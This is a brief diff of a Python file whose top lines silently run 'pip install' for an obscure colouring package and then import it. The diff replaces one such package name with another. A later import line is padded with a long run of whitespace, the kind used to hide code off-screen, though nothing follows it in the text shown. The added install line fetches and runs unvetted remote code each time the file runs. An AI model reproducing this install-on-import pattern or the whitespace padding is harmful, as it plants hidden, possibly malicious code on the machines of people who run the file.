@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringspackageV1")
-import syscolouringspackageV1
+os.system("pip install pythoncolouringpackageV1")
+import pythoncolouringpackageV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
